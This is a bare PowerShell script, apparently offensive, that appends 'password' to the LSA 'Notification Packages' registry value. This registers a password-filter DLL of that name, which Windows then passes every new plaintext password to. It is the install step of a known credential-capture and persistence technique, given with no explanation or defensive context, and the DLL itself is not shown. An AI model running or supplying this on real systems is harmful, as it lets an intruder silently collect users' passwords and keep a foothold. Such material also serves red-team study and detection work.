$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Notification Packages"
$UpdatedValue = $Path."Notification Packages" + "password"
Set-ItemProperty -Path $Path.PSPath -Name "Notification Packages" -Value $UpdatedValue -Force
